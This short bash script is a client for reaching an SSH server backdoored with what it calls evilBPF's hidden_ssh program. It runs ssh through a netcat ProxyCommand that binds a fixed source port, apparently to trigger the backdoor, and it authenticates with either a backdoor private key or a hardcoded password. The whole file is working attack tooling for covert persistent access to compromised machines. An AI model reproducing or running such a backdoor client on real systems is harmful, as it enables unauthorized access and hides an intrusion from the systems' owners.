#!/bin/bash

# This script is a little helper to connect to the backdoored SSH server with evilBPF's hidden_ssh program.

# Definitions (change these if needed)
KEY_PORT=2345
PRIVATE_KEY_PATH="backdoor_key"

PASSWD_PORT=2346
PASSWD="lol"

# Check arguments
ARGC=$#
if [ $ARGC -ne 4 ]; then
    echo "Usage: $0 <user> <server_ip> <server_port> <key|passwd>"
    exit 1
fi

USER=$1
SERVER=$2
PORT=$3
MODE=$4

# Run the client
if [ "$MODE" == "key" ]; then
    ssh -o 'ProxyCommand nc -p '$KEY_PORT' %h %p' -i $PRIVATE_KEY_PATH -p $PORT $USER@$SERVER -o 'PreferredAuthentications=publickey' -o 'PasswordAuthentication=no'
elif [ "$MODE" == "passwd" ]; then
    echo "You'll be asked for the password, which is: $PASSWD"
    ssh -o 'ProxyCommand nc -p '$PASSWD_PORT' %h %p' -p $PORT $USER@$SERVER -o 'PreferredAuthentications=password' -o 'PasswordAuthentication=yes'
else
    echo "Invalid mode"
    exit 1
fi